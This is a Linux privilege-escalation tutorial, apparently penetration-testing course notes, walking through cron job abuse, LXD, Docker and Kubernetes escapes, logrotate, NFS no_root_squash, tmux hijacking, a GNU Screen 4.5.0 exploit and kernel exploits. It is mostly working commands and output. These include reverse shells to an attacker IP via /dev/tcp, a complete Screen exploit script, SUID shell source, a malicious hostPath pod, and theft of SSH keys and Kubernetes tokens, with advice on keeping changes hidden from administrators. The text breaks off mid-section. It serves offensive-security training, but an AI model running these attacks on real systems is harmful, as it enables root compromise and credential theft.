Moving On

At this point you have covered the complete set of common privilege escalation vectors that rely on misconfigurations and special permissions: restricted shell escapes, PATH abuse, wildcard abuse in cron jobs, SUID and SGID binary exploitation, sudo rights abuse including dangerous flags like tcpdump's postrotate, privileged group membership exploitation through LXD, Docker, Disk, and ADM, and Linux capabilities enumeration and exploitation. The next areas to investigate in a real engagement are kernel exploits for the specific kernel version identified during enumeration, shared object hijacking against SUID binaries that load shared libraries from writable paths, and NFS root squashing misconfigurations. Always document every finding and every command run, and always attempt the simplest misconfigurations first before moving to more complex exploit techniques.



Linux Privilege Escalation — Cron Job Abuse, Containers, Docker, Kubernetes, Logrotate, Miscellaneous Techniques, Python Library Hijacking, Vulnerable Services, Kernel Exploits, Shared Libraries & Shared Object Hijacking
Cron Job Abuse

Cron jobs are scheduled tasks configured to run automatically at specified intervals on Linux systems. They are typically used for administrative tasks such as running backups, cleaning up directories, rotating logs, and other routine maintenance. The crontab command creates a cron file which will be run by the cron daemon on the schedule specified, and when created the cron file is stored in /var/spool/cron for the specific user that created it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, and the command to run. For example the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours. The root crontab is almost always only editable by root or a user with full sudo privileges, however it can still be abused if the scripts it calls are world-writable. Even if you cannot read the crontab directly, you can often determine the schedule by watching how frequently output files are generated.

Finding World-Writable Files and Cron Scripts

The first step in cron job abuse is finding world-writable files and scripts on the system that might be called by a cron job running as root. The find command below searches the entire filesystem excluding /proc for any file that has the world-write permission bit set. The results reveal which files any user can modify. If a script appears in a location like /dmz-backups/ or /home/backupsvc/ and the directory shows files being generated at regular intervals, that is a strong indicator the script is being executed by a cron job. Certain applications create cron files in /etc/cron.d and may be misconfigured to allow non-root users to edit them, which is worth checking separately.

$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/home/backupsvc/backup.sh
<SNIP>
Identifying the Cron Schedule from Directory Contents

After finding a potentially interesting world-writable script, the next step is to determine how frequently the cron job runs. You can do this by looking at the timestamps of output files in the same directory as the script. If backup archive files are appearing every three minutes, the cron job is running every three minutes. This is also where misconfigured cron schedules are caught — an administrator who intended 0 */3 * * * (every three hours) but wrote */3 * * * * (every three minutes) has made a significant error. The shorter the interval the better for you as an attacker, because you spend less time waiting for your injected payload to execute. Always note the modification timestamps of generated files and compare them to determine the exact interval.

$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz

Files generating every 3 minutes confirms the cron job interval.

Confirming Cron Jobs with pspy

Pspy is a command-line tool used to view running processes without the need for root privileges. It works by scanning procfs and watching filesystem events using inotify, allowing you to see commands run by other users and cron jobs in real time without needing to read the crontab file directly. The -pf flag tells pspy to print both commands and filesystem events, and -i 1000 sets the scan interval to 1000 milliseconds (every second). When you run pspy and wait, you will see root-owned cron jobs appear in the output with UID=0 as they execute. This is a reliable way to confirm what is running as root even when you cannot read /etc/crontab or /var/spool/cron/crontabs/root.

$ ./pspy64 -pf -i 1000

2020/09/04 20:46:01 CMD: UID=0  PID=2199 | /usr/sbin/CRON -f
2020/09/04 20:46:01 CMD: UID=0  PID=2200 | /bin/sh -c /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0  PID=2201 | /bin/bash /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0  PID=2204 | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html

The output confirms backup.sh runs as UID=0 (root) every minute.

Reading the Target Cron Script

Before modifying the world-writable cron script, always read its contents first to understand exactly what it does and what variables it uses. Understanding the script means you can append your payload at the end without breaking the original functionality — this is important because a broken script might cause the cron daemon to stop running it, which would prevent your payload from executing. You should also take a backup of the original script before making any changes so you can restore it if needed. The script below simply creates a compressed tarball of the web root at a timestamped filename in the backup destination directory.

$ cat /dmz-backups/backup.sh

#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
Exploiting the World-Writable Cron Script

Now that you understand what the script does, append a reverse shell one-liner to the end of the script. Appending rather than replacing ensures the original script still functions, which keeps the cron job running and avoids alerting the administrator that something has changed. The reverse shell payload uses bash's built-in TCP redirection to connect back to your netcat listener. Set up the listener first, then modify the script. Wait for the cron interval to pass and you will receive a root shell connection automatically.

$ cat /dmz-backups/backup.sh

#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/10.10.14.3/443 0>&1

Start listener on attack machine:

$ nc -lnvp 443

Wait for the cron job to run. Within three minutes:

connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882

root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
NIX02
Containers

Containers operate at the operating system level while virtual machines operate at the hardware level. Containers share the host system's operating system kernel and isolate application processes from the rest of the system using kernel features like namespaces and cgroups, while classic virtualization allows multiple complete operating systems to run simultaneously on a single physical machine. Isolation and virtualization are essential because they help manage resources and security aspects as efficiently as possible — for example they facilitate monitoring to find errors, and allow isolation of processes that usually require root privileges such as web applications that must be separated from the host system. The two primary container technologies relevant to privilege escalation are Linux Containers (LXC/LXD) and Docker. Understanding how they work is important because membership in the lxd or docker groups on a host provides a straightforward path to root even without any traditional vulnerability.

Linux Containers — LXC and LXD

Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel. Linux Daemon (LXD) is similar but is designed to contain a complete operating system rather than a single application — it is a system container manager rather than an application container manager. LXD is Ubuntu's default container manager and upon its installation all users are automatically added to the lxd group. LXC consumes fewer resources than virtual machines and has a standard interface making it easy to manage multiple containers simultaneously. The key privilege escalation technique with LXD works by creating a privileged container with security.privileged=true which disables UID mapping so that the root user inside the container is the same root user as on the host, then mounting the host filesystem into the container.

LXD — Confirming Group Membership

Before attempting LXD privilege escalation the first step is to confirm your current user belongs to the lxd group. Use the id command which shows all group memberships for the current user. If lxd appears in the groups list you have the permissions needed to create and manage containers. On systems where LXD is installed you can also check whether an LXD-compatible container image is already present on the system in directories like ~/ContainerImages/ because administrators often leave pre-built images for testing purposes. These test images frequently have no passwords set and minimal security configuration, making them easy to use directly for the privilege escalation without needing to download anything from the internet.

$ id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

$ cd ContainerImages
$ ls
ubuntu-template.tar.xz
LXD — Importing the Container Image

The next step is to import the available container image into LXD so it can be used to create a new container instance. The lxc image import command takes the archive file and assigns it an alias that you will use to reference it when creating the container. After importing, verify the image was successfully added using lxc image list. The fingerprint, architecture, size, and upload date should all be visible. This step is necessary because LXD needs a registered image before it can spin up a new container from it. If no image exists on the system you would need to transfer one from your attack machine, but in most cases administrators leave at least one template available for their own development and testing use.

$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
$ lxc image list

+---------------------+--------------+--------+------------------------------------------+--------------+-----------+
| ALIAS               | FINGERPRINT  | PUBLIC | DESCRIPTION                              | ARCHITECTURE | SIZE      |
+---------------------+--------------+--------+------------------------------------------+--------------+-----------+
| ubuntu/18.04        | 623c9f0bde47 | no     | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | 106.49MB  |
+---------------------+--------------+--------+------------------------------------------+--------------+-----------+
LXD — Creating a Privileged Container and Mounting Host Filesystem

This is the core of the LXD privilege escalation. First initialise the container with security.privileged=true which disables all isolation features and makes the root user inside the container identical to root on the host. Then add a device that mounts the host's root filesystem at /mnt/root inside the container using recursive=true so all subdirectories are included. With security.privileged=true set, the root user inside the container bypasses all filesystem permission checks because the kernel treats it as the actual host root. This gives you read and write access to every file on the host system including /etc/shadow, SSH keys, and any other sensitive data.

$ lxc init ubuntutemp privesc -c security.privileged=true
Creating privesc

$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc

$ lxc start privesc
$ lxc exec privesc /bin/bash

root@nix02:~# id
uid=0(root) gid=0(root)

root@nix02:~# ls -l /mnt/root
total 68
drwxr-xr-x 100 root root 4096 Sep 22 13:27 etc
drwx------   6 root root 4096 Sep 26 21:11 root
<SNIP>

root@nix02:~# cat /mnt/root/etc/shadow
root@nix02:~# cat /mnt/root/root/.ssh/id_rsa
Docker

Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources. The Docker architecture is built on a client-server model with two primary components: the Docker daemon which is responsible for executing commands and managing containers, and the Docker client which acts as the interface for issuing commands. The Docker daemon handles container creation, execution, monitoring, image management, networking, and storage management. A Docker container is an instance of a Docker image — it is a lightweight isolated executable environment that runs applications with its own filesystem, processes, and network interfaces. From a privilege escalation perspective, membership in the docker group, a writable Docker socket, or Docker having SUID set are all equivalent to root-level access.

Docker — Architecture Overview

The Docker daemon (also called the Docker server) is the powerhouse behind Docker. It runs Docker containers, interacts with them, and manages them on the host system. It coordinates container creation, execution, and monitoring while maintaining their isolation from the host. It handles Docker image management by pulling images from registries like Docker Hub and storing them locally. It also provides monitoring and logging capabilities, captures container logs, monitors resource utilization such as CPU, memory, and network usage, facilitates container networking by creating virtual networks, and handles Docker volumes which persist data beyond container lifespans. The Docker client communicates with the daemon through a RESTful API or a Unix socket. Docker Compose is another client that simplifies orchestration of multiple containers as a single application using declarative YAML files.

Docker Group Privilege Escalation

Placing a user in the docker group is essentially equivalent to giving them unrestricted root-level access to the entire host filesystem without requiring a password. Members of the docker group can create new Docker containers and mount any directory from the host into those containers. The attack works by running a new Docker container with the host root directory mounted into it, then browsing the mounted filesystem as root inside the container. The docker run command with -v /root:/mnt mounts the host's /root directory at /mnt inside the container. Once inside you can read /etc/shadow, SSH keys, or write new SSH keys for persistent root access. The -it ubuntu part simply runs an interactive shell using the Ubuntu image.

$ id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)

$ docker image ls
REPOSITORY   TAG     IMAGE ID       CREATED       SIZE
ubuntu       20.04   20fffa419e3a   2 days ago    72.8MB

$ docker run -v /root:/mnt -it ubuntu

root@container:/# id
uid=0(root) gid=0(root)

root@container:/# ls /mnt
.bash_history  .ssh  root.txt

root@container:/# cat /mnt/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
<SNIP>
Docker Shared Directories

When using Docker, shared directories (volume mounts) bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system are made accessible within the container, which is incredibly useful for persisting data, sharing code, and facilitating collaboration. However from an attacker's perspective, when you gain access to a Docker container and enumerate it locally you may find non-standard mounted directories exposed from the host system. These shared directories can contain sensitive data including SSH private keys, bash history files, and application credentials. The key is to look for directories in the container root that do not belong to a standard Linux filesystem layout — names like /hostsystem, /host, /data, or similar are red flags that indicate a host directory has been mounted.

root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw------- 1 cry0l1t3 cry0l1t3 12559 Jun 30 15:09 .bash_history
drwxr-x--- 10 cry0l1t3 cry0l1t3  4096 Jun 30 15:09 .ssh

root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>

$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
Docker Sockets

A Docker socket (also called the Docker daemon socket) is a special file that allows processes to communicate with the Docker daemon. It acts as a bridge between the Docker client and daemon. When you issue a Docker command the client sends it to the Docker socket and the daemon processes and executes it. The socket is normally located at /var/run/docker.sock and is typically only writable by root or members of the docker group. However if you find a Docker socket that is world-writable or accessible to your current user, you can use it to issue Docker commands directly — even if you are not in the docker group. You can also find the Docker socket inside containers themselves if it has been mounted in, which allows escaping the container by using it to spin up new privileged containers.

$ ls -al ~/app/
srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock

$ wget https://<parrot-os>:443/docker -O /tmp/docker
$ chmod +x /tmp/docker

$ /tmp/docker -H unix:///app/docker.sock ps
CONTAINER ID  IMAGE     COMMAND              CREATED    STATUS         NAMES
3fe8a4782311  main_app  "/docker-entry.s..."  3 days ago  Up 12 minutes  app
Docker Socket — Creating a Privileged Escape Container

Once you have access to a Docker socket, whether inside a container or on the host, you can use it to create a new privileged container that mounts the host root filesystem. The command below runs a new container using the main_app image (or any available image), with --privileged flag to disable all security restrictions, mounting the host's / at /hostsystem inside the new container. Once this privileged container is running, you exec into it and have full root access to the host filesystem at /hostsystem. From there you can read SSH keys, shadow files, or perform any other privileged actions on the host.

$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

$ /tmp/docker -H unix:///app/docker.sock ps
CONTAINER ID  IMAGE     CREATED          STATUS
7ae3bcc818af  main_app  12 seconds ago   Up 8 seconds
3fe8a4782311  main_app  3 days ago       Up 17 minutes

$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
<SNIP>
Docker Socket — Writable on Host

If the Docker socket at /var/run/docker.sock is writable by your current user without being in the docker group, you can use it directly with the docker command specifying the socket path with -H unix:///var/run/docker.sock. The command below mounts the host root at /mnt inside an Ubuntu container, then immediately runs chroot /mnt bash to change root into the host filesystem and get a full root shell. This is the cleanest and most direct Docker socket escalation technique when the socket is accessible.

$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l
total 68
drwxr-xr-x 100 root root 4096 Sep 22 etc
drwx------   6 root root 4096 Sep 26 root
<SNIP>

root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
Kubernetes

Kubernetes (K8s) is an open-source container orchestration platform developed by Google that automates the deployment, scaling, and management of application containers. It has become the industry gold standard for microservices orchestration and is used across public cloud services like Google Cloud, Azure, and AWS as well as private on-premises data centers. Kubernetes architecture is divided into a Control Plane (master node) which manages and coordinates all cluster activities, and Worker Nodes (minions) where containerized applications actually run. The key concept in Kubernetes is the pod — a group of one or more closely connected containers that share a network namespace and storage. Understanding Kubernetes security is crucial for penetration testers because during engagements you will frequently land inside a container that is part of a K8s cluster, and the cluster may have misconfigurations that allow escalation to the host or lateral movement to other pods.

Kubernetes Architecture — Key Components

The Control Plane consists of several critical services each listening on specific TCP ports that are important to know for enumeration and attack:

etcd                 — ports 2379, 2380  — stores all cluster state and configuration data
API server           — port 6443         — main entry point for all administrative commands
Scheduler            — port 10251        — decides which node runs each new pod
Controller Manager   — port 10252        — maintains desired cluster state
Kubelet API          — port 10250        — manages containers on each worker node
Read-Only Kubelet    — port 10255        — unauthenticated read-only access to node data

The API server is the entry point for all administrative commands from users via kubectl or from controllers. The Kubelet can be configured to permit anonymous access by default, meaning any process or user that can reach the Kubelet API can make requests and receive responses without authentication, potentially exposing sensitive information or enabling unauthorized actions.

Kubernetes — API Server Interaction

The first step when assessing a Kubernetes environment is to probe the API server to determine what access level you have. The API server listens on port 6443 by default and uses TLS. Use curl with the -k flag to bypass certificate verification. If you receive a 403 Forbidden response mentioning system:anonymous, it means anonymous access is enabled but restricted — the cluster acknowledges your request but denies access to the root path. This still confirms the API server is running and reachable. Some clusters may have broader anonymous access configured, which would allow you to enumerate resources without any credentials. Always check the API server and the Kubelet API separately as they have different access controls.

$ curl https://10.129.10.11:6443 -k

{
    "kind": "Status",
    "apiVersion": "v1",
    "status": "Failure",
    "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
    "reason": "Forbidden",
    "code": 403
}
Kubernetes — Kubelet API Extracting Pods

The Kubelet API running on port 10250 manages containers on each worker node and is a higher-value target than the main API server in many misconfigured clusters. If the Kubelet allows anonymous access, you can enumerate all running pods and their configurations without any credentials. The /pods endpoint returns a full JSON listing of every pod on the node including their names, namespaces, container images, creation timestamps, and critically the last applied configuration which can contain secrets, API tokens, and passwords. The jq tool is used to format the JSON output for readability. Understanding what pods are running, what images they use, and what their configurations contain is essential for planning the next steps of your attack.

$ curl https://10.129.10.11:10250/pods -k | jq .

{
  "kind": "PodList",
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c"
      }
    }
  ]
}

$ kubeletctl -i --server 10.129.10.11 pods

+---+----------------------------------+-------------+-------------------------+
|   | POD                              | NAMESPACE   | CONTAINERS              |
+---+----------------------------------+-------------+-------------------------+
| 1 | coredns-78fcd69978-zbwf9         | kube-system | coredns                 |
| 2 | nginx                            | default     | nginx                   |
| 3 | etcd-steamcloud                  | kube-system | etcd                    |
+---+----------------------------------+-------------+-------------------------+
Kubernetes — Scanning for RCE and Executing Commands

After enumerating pods, the next step is to determine which pods are vulnerable to Remote Code Execution. The kubeletctl scan rce command tests each pod for the ability to execute commands and marks those that allow it with a + in the RCE column. This immediately tells you which containers you can execute commands inside without needing any additional credentials. Once you identify a vulnerable pod, use kubeletctl exec to run commands inside it specifying the pod name with -p and the container name with -c. The first command to run is always id to determine what user you are inside the container. Root inside a container opens the door to extracting service account tokens and certificates which can then be used to escalate privileges within the Kubernetes cluster itself.

$ kubeletctl -i --server 10.129.10.11 scan rce

+---+--------------+------------------+-------------+----------+-----+
|   | NODE IP      | PODS             | NAMESPACE   | CONTNAME | RCE |
+---+--------------+------------------+-------------+----------+-----+
| 1 | 10.129.10.11 | nginx            | default     | nginx    | +   |
| 2 |              | etcd-steamcloud  | kube-system | etcd     | -   |
+---+--------------+------------------+-------------+----------+-----+

$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
Kubernetes — Extracting Tokens and Certificates

Running as root inside a Kubernetes pod means you can read the service account credentials that are automatically mounted into every pod. These are stored in /var/run/secrets/kubernetes.io/serviceaccount/ and include the token (a JWT used for API authentication) and the ca.crt (the cluster's certificate authority certificate needed to verify TLS connections to the API server). Extracting both and saving them to files on your attack machine is a critical step because they allow you to authenticate to the Kubernetes API server as the pod's service account. The tee -a flag both displays the output and saves it to a file simultaneously. Once you have these credentials you can enumerate what permissions the service account has within the cluster.

$ kubeletctl -i --server 10.129.10.11 exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZCI6...<SNIP>

$ kubeletctl --server 10.129.10.11 exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
-----END CERTIFICATE-----
Kubernetes — Listing Privileges and Escalating

With the extracted token and certificate you can now authenticate to the Kubernetes API server and check what actions the service account is permitted to perform. The kubectl auth can-i --list command returns a complete list of all resources and the verbs (get, create, list, delete, etc.) the service account can perform on them. If the service account has permissions to create pods, you can create a malicious pod that mounts the host root filesystem — exactly the same technique as LXD and Docker. The YAML manifest below defines a pod that mounts the host filesystem at /root inside the container, giving you full read and write access to the host from within the pod.

$ export token=`cat k8.token`
$ kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.10.11:6443 auth can-i --list

Resources                                    Verbs
pods                                         [get create list]
selfsubjectaccessreviews.authorization.k8s.io [create]

privesc.yaml:

yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
$ kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.96.98:6443 apply -f privesc.yaml
pod/privesc created

$ kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.96.98:6443 get pods
NAME     READY  STATUS   RESTARTS  AGE
nginx    1/1    Running  0         23m
privesc  1/1    Running  0         12s

$ kubeletctl --server 10.129.10.11 exec \
  "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
Logrotate

Logrotate is a Linux system utility that manages log files by archiving, compressing, and disposing of old logs on a scheduled basis to prevent the hard disk from filling up with log data. Without logrotate, log files would grow indefinitely until they consumed all available disk space. Logrotate is usually started periodically via cron and its behaviour is controlled by the configuration file /etc/logrotate.conf which contains global settings, and by per-package configuration files dropped into /etc/logrotate.d/. The configuration allows specifying the size threshold for rotation, the age of logs before rotation, how many rotated copies to keep, whether to compress them, and what action to take when a log file is rotated. The rotation function works by renaming log files — new ones are created for each rotation period and older ones are renamed or deleted according to the configuration. Logrotate can be exploited via a vulnerability called logrotten when certain conditions are met.

Logrotate — Configuration Files

Understanding the logrotate configuration is necessary both for exploitation and for understanding what logs are managed on the system. The main configuration at /etc/logrotate.conf sets global defaults including rotation schedule, how many rotated copies to keep, whether to create new empty log files after rotation, and whether to compress rotated files. Individual package configurations in /etc/logrotate.d/ override these globals for specific log files. The status file at /var/lib/logrotate.status records when each log file was last rotated. The key option to identify for exploitation is whether create or compress is the active rotation method because the logrotten exploit has different versions for each option. The grep command below extracts which option is active.

$ cat /etc/logrotate.conf

weekly
su root adm
rotate 4
create
include /etc/logrotate.d

$ ls /etc/logrotate.d/
alternatives  apport  apt  bootlog  btmp  dpkg  rsyslog  ufw

$ cat /etc/logrotate.d/dpkg
/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}

$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create
Logrotate — Exploitation with logrotten

The logrotten exploit targets a race condition in logrotate's log file handling. The requirements to exploit logrotate are: you must have write permissions on the log files being rotated, logrotate must run as root or a privileged user, and the installed version of logrotate must be one of the vulnerable versions: 3.8.6, 3.11.0, 3.15.0, or 3.18.0. The exploit is compiled on a system with a compatible kernel and transferred to the target. A reverse shell payload is written to a file which logrotten will execute during the rotation race condition. The logrotten exploit takes the payload file and the target log file as arguments. Start your netcat listener before running it and you will receive a root shell when the rotation is triggered.

$ git clone https://github.com/whotwagner/logrotten.git
$ cd logrotten
$ gcc logrotten.c -o logrotten

$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create

$ nc -nlvp 9001

$ ./logrotten -p ./payload /tmp/tmp.log

Connection received on 10.129.24.11 49818
# id
uid=0(root) gid=0(root) groups=0(root)
Miscellaneous Techniques — Passive Traffic Capture

If tcpdump is installed on the system, unprivileged users may be able to capture network traffic depending on the system's configuration. Captured traffic can contain credentials passed in cleartext over protocols like HTTP, FTP, POP, IMAP, telnet, and SMTP which do not encrypt their communications. Tools like net-creds and PCredz can analyse captured packet data and automatically extract credentials, credit card numbers, SNMP community strings, and other sensitive values. Beyond cleartext credentials, traffic capture can also yield Net-NTLMv2 challenge-response hashes, SMBv2 authentication data, and Kerberos tickets which can be subjected to offline brute force or cracking attacks to recover plaintext passwords. This technique is passive and leaves minimal forensic trace compared to active exploitation.

$ tcpdump -i ens192 -w /tmp/capture.pcap
$ net-creds /tmp/capture.pcap
$ PCredz -f /tmp/capture.pcap
Weak NFS Privileges

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. The critical configuration option that determines privilege escalation viability is no_root_squash — when this is set, remote users connecting as root on their own machine will be treated as root on the NFS server as well, allowing creation of files owned by root and setting SUID bits. The default option root_squash maps root access to the unprivileged nfsnobody account preventing this. The attack works by mounting the NFS share from your attack machine as root, compiling a SUID shell binary locally, copying it to the mounted NFS share, and setting the SUID bit — then executing it on the target to get a root shell.

$ showmount -e 10.129.2.12
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *

$ cat /etc/exports
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)

Compile the SUID shell on the attack machine:

root@Pwnbox:/tmp$ cat shell.c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

root@Pwnbox:/tmp$ gcc shell.c -o shell
root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:/tmp$ cp shell /mnt
root@Pwnbox:/tmp$ chmod u+s /mnt/shell

Execute on the target:

htb@NIX02:/tmp$ ls -la
-rwsr-xr-x 1 root root 16712 Sep 1 06:15 shell

htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
Hijacking Tmux Sessions

Terminal multiplexers like tmux allow multiple terminal sessions to be accessed within a single console session. A user may detach from a tmux session and leave it running — for example while a long nmap scan completes. If a privileged user such as root has left a tmux session running with weak socket permissions, any user who can access that socket can attach to the session and inherit all of its privileges. A shared tmux session is created by specifying a custom socket path with -S. If the socket file is owned by root but has group read-write permissions set for a group your user belongs to, you can attach to the root tmux session and get a root shell by simply running tmux -S <socket_path>.

$ ps aux | grep tmux
root  4806  0.0  0.1  29416  3204 ?  Ss  06:27  0:00 tmux -S /shareds new -s debugsess

$ ls -la /shareds
srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds

$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

$ tmux -S /shareds

id
uid=0(root) gid=0(root) groups=0(root)
Vulnerable Services — Screen 4.5.0

Many services found on Linux systems have publicly known vulnerabilities that can be leveraged for privilege escalation. GNU Screen version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file. Because Screen is often installed as SUID root to manage terminal sessions, this vulnerability allows an attacker to truncate any file or create a file owned by root in any directory, which is then leveraged through the ld.so.preload mechanism to load a malicious shared library and gain a root shell. The first step is to identify the installed Screen version — if it is 4.05.00, a pre-built exploit script is directly applicable.

$ screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
Screen 4.5.0 — Exploit Script

The exploit script automates the full attack chain: it compiles a malicious shared library (libhax.so) that sets SUID on a root shell binary when loaded, compiles the root shell binary (rootshell), uses Screen's log file vulnerability to write the library path into /etc/ld.so.preload, and then triggers Screen to load the library. The __attribute__((__constructor__)) annotation on the dropshell function causes it to run automatically when the library is loaded, setting SUID on the rootshell binary. Once triggered, running /tmp/rootshell gives an immediate root shell.

$ ./screen_exploit.sh

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
[+] done!

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),1000(mrb3n)

The full exploit script (Screen_Exploit_POC.sh):

bash
#!/bin/bash
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0); setgid(0); seteuid(0); setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
echo "[+] Triggering..."
screen -ls
/tmp/rootshell
Kernel Exploits

Kernel-level exploits target vulnerabilities in the Linux kernel itself to execute code with root privileges regardless of any user-level permission controls. These are among the most powerful privilege escalation techniques because they bypass all software-level security controls — SUID restrictions, sudo rules, AppArmor, SELinux. A very well-known example is Dirty COW (CVE-2016-5195) which affected kernels from 2.x through 4.8.x. It is common to find systems vulnerable to kernel exploits, particularly legacy systems that are excluded from patching due to compatibility requirements with specific services or applications. The attack process is straightforward: identify the kernel version, search for a public exploit for that version, download, compile, and execute it. Always check kernel exploits in a test environment first as they can cause system instability or crashes on production systems.

Kernel Exploit — Identification and Execution

The first step is to precisely identify the kernel version and Linux distribution. The uname -a command gives the full kernel version string and cat /etc/lsb-release gives the distribution and release version. These two pieces of information together allow you to search Google or exploit-db for applicable kernel exploit PoCs. Once you find a matching exploit, download the C source code to the target system, compile it with gcc, make it executable, and run it. Well-written kernel exploits drop you into a root shell automatically. Be aware that some exploits require modification for specific kernel sub-versions — always read the exploit source or README before running it.

$ uname -a
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 GNU/Linux

$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
